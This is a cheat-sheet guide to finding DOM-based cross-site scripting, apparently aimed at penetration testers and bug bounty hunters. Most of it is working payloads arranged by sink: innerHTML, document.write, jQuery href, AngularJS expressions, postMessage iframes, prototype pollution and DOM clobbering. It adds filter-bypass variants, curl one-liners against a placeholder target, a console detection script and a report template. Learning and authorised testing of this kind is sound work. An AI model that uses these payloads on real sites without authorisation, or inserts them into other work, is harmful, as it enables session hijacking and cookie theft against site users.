# DOM-Based Vulnerabilities Quick Start Guide

## Fast Track to Finding DOM XSS

### 1. Quick Identification (5 minutes)

**Check for AngularJS:**
```
View source → Look for: ng-app, angular.js
Payload: {{$on.constructor('alert(1)')()}}
```

**Check for jQuery:**
```
Console: typeof jQuery or typeof $
Payload for $(selector): <img src=x onerror=alert(1)>
```

**Check URL parameters:**
```
Search box → Submit → Check URL
Parameter reflects → Test payload
```

### 2. Common Injection Points

| Location | Source | Test |
|----------|--------|------|
| Search box | `location.search` | `?q=<img src=x onerror=alert(1)>` |
| URL fragment | `location.hash` | `#<img src=x onerror=alert(1)>` |
| Form inputs | Various | Submit with payload |
| postMessage | `event.data` | iframe + postMessage |

### 3. Context-Based Payloads

**HTML Context:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**innerHTML Sink:**
```html
<img src=1 onerror=alert(1)>
```
*Note: `<script>` tags don't work!*

**jQuery href:**
```
javascript:alert(document.cookie)
```

**AngularJS:**
```javascript
{{$on.constructor('alert(1)')()}}
```

**Inside Select:**
```html
"></select><img src=x onerror=alert(1)>
```

### 4. Common DOM XSS Patterns by Sink

#### document.write sink
```
/?search="><svg onload=alert(1)>
```
Break out of attribute context with `">` then inject XSS tag.

#### innerHTML sink
```
/?search=<img src=1 onerror=alert(1)>
```
Note: `<script>` tags don't execute via innerHTML — use event handler tags instead.

#### jQuery href sink
```
/page?returnPath=javascript:alert(document.cookie)
```
Click the link that uses the polluted href to trigger execution.

#### jQuery hashchange sink
```html
<!-- From attacker-controlled page -->
<iframe src="https://target.com/#" onload="this.src+='<img src=x onerror=alert(document.cookie)>'"></iframe>
```
Appends to hash to trigger hashchange event handler.

#### AngularJS expression sink
```
/?search={{$on.constructor('alert(1)')()}}
```
Evaluates as AngularJS template expression.

#### Inside select element
```
/product?storeId="></select><img src=1 onerror=alert(1)>
```
Break out of `<select>` context first.

#### postMessage sink (HTML context)
```html
<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')"></iframe>
```

#### postMessage sink (JavaScript URL)
```html
<iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//https:','*')"></iframe>
```

#### postMessage sink (JSON.parse with type dispatch)
```html
<iframe src="https://target.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'></iframe>
```

#### Prototype pollution sink
```
/?__proto__[transport_url]=data:,alert(1);
/?__proto__.sequence=alert(1)-
```

#### DOM clobbering (id collision)
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
Clobbers `document.getElementById('defaultAvatar')` to inject attribute.

#### DOM clobbering (attributes property)
```html
<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes></form>
```
Navigate to `#x` to trigger focus event. The `<input id=attributes>` clobbers `form.attributes`.

### 5. Burp Suite DOM Invader Quick Setup

1. **Enable:** F12 → DOM Invader tab → Toggle ON
2. **Auto-inject:** Enable "Inject URL params"
3. **Check sinks:** Review "Sinks" panel
4. **Scan pollution:** Click "Scan for prototype pollution"
5. **Scan gadgets:** Click "Scan for gadgets"
6. **Exploit:** Click "Exploit" button

**Total time:** 1 minute setup

### 6. Quick Wins

**Always try first:**
```html
1. <img src=x onerror=alert(1)>
2. <svg onload=alert(1)>
3. "><script>alert(1)</script>
4. javascript:alert(1)
5. {{$on.constructor('alert(1)')()}}
```

**For innerHTML specifically:**
```html
<img src=1 onerror=alert(1)>
```

**For hash-based:**
```
Create iframe with hash change trigger
```

**For postMessage:**
```html
<iframe src="URL" onload="this.contentWindow.postMessage('PAYLOAD','*')"></iframe>
```

### 7. Common Mistakes to Avoid

- ❌ Using `<script>` tags with innerHTML
- ❌ Forgetting to close tags when breaking out
- ❌ Not clicking links for href-based XSS
- ❌ Testing hashchange without iframe wrapper
- ❌ Forgetting the `//` comment in prototype pollution
- ❌ Using wrong parameter names

### 8. Quick Detection Script

**Run in browser console:**
```javascript
// Quick DOM XSS detector
(function(){
    let risks = [];

    // Check sources
    if (document.body.innerHTML.includes(location.search.slice(1)))
        risks.push('URL param reflected');
    if (document.body.innerHTML.includes(location.hash.slice(1)))
        risks.push('Hash reflected');

    // Check frameworks
    if (typeof angular !== 'undefined')
        risks.push('AngularJS detected');
    if (typeof jQuery !== 'undefined')
        risks.push('jQuery detected');

    // Check for postMessage
    let scripts = [...document.scripts].map(s => s.textContent).join('');
    if (scripts.includes('addEventListener') && scripts.includes('message'))
        risks.push('postMessage listener found');

    if (risks.length) {
        console.log('%c[!] Potential DOM XSS vectors:', 'color:red;font-weight:bold');
        risks.forEach(r => console.log('  - ' + r));
    } else {
        console.log('%c[✓] No obvious DOM XSS vectors', 'color:green');
    }
})();
```

### 9. Payload Encoding Quick Reference

**HTML encoding:**
```
< = &lt; or &#60; or &#x3C;
> = &gt; or &#62; or &#x3E;
" = &quot; or &#34;
```

**URL encoding:**
```
< = %3C
> = %3E
" = %22
' = %27
space = %20 or +
```

**JavaScript Unicode:**
```
alert = \u0061\u006c\u0065\u0072\u0074
```

### 10. Quick Bypass Techniques

**Filter bypasses:**
```html
<!-- If <script> is blocked -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>

<!-- If alert is blocked -->
<img src=x onerror=window['ale'+'rt'](1)>

<!-- If ( is blocked -->
<svg onload=alert`1`>

<!-- If quotes are blocked -->
<img src=x onerror=alert(1)>
```

### 11. Speed Testing Workflow

**1 minute test:**
1. Find input field
2. Submit: `<img src=x onerror=alert(1)>`
3. Check if it executes
4. Done

**5 minute test:**
1. Test all input fields
2. Test URL parameters
3. Test hash fragments
4. Check browser console for errors
5. Review JavaScript files

**15 minute test:**
1. All above
2. Enable DOM Invader
3. Scan for prototype pollution
4. Check for postMessage listeners
5. Test with Burp Intruder
6. Review all JavaScript for sinks

### 12. Cheat Sheet URLs

**Common sink payloads by context:**
```
document.write: /?search="><svg onload=alert(1)>
innerHTML: /?search=<img src=1 onerror=alert(1)>
jQuery href: /feedback?returnPath=javascript:alert(document.cookie)
AngularJS: /?search={{$on.constructor('alert(1)')()}}
select element: /product?storeId="></select><img src=1 onerror=alert(1)>
prototype pollution XSS: /?__proto__[transport_url]=data:,alert(1);//
prototype pollution seq: /?__proto__.sequence=alert(1)-
```

### 13. One-Liner Tests

```bash
# Test URL parameter
curl "https://target.com/?q=<img src=x onerror=alert(1)>" | grep -i "img src=x"

# Test all parameters
for p in id user search q; do
  curl "https://target.com/?$p=TEST123" | grep -i "TEST123" && echo "[+] $p reflects"
done
```

### 14. Bug Bounty Quick Wins

**High-value targets:**
- Payment pages (sensitive data)
- Admin panels (privilege escalation)
- File upload forms (stored XSS)
- Search functionality (common entry point)
- postMessage handlers (often overlooked)

**Quick checks:**
1. Search box → Payload → Execute? → Report
2. Hash fragment → Payload → Execute? → Report
3. Prototype pollution → Gadget → XSS? → Report

**Report template:**
```
Title: DOM XSS in [location]
Severity: High
Steps:
1. Navigate to [URL]
2. Inject payload: [PAYLOAD]
3. Observe XSS execution
Impact: Cookie theft, session hijacking, etc.
```

### 15. Time-Saving Tips

- **Use DOM Invader:** Automates 80% of detection
- **Copy-paste payloads:** Don't type them manually
- **Test in order:** Start with simplest payloads first
- **Browser snippets:** Save common test scripts
- **Burp macros:** Automate login and navigation
- **Practice regularly:** Speed comes from repetition

---

## Quick Reference Card

| Sink | Payload |
|------|---------|
| document.write | `"><svg onload=alert(1)>` |
| innerHTML | `<img src=x onerror=alert(1)>` |
| jQuery $() | `<img src=x onerror=alert(1)>` |
| jQuery .attr(href) | `javascript:alert(1)` |
| AngularJS | `{{$on.constructor('alert(1)')()}}` |
| eval() | `alert(1)` |
| postMessage | iframe + postMessage |
| Prototype pollution | `/?__proto__[prop]=value` |
| DOM clobbering | `<a id=var><a id=var name=prop>` |

**Most versatile payload:**
```html
<img src=x onerror=alert(1)>
```

**Works in:** Most contexts, innerHTML, jQuery, document.write

---

**Pro Tip:** Practice each sink type systematically until the payload selection becomes instinctive for real-world testing.

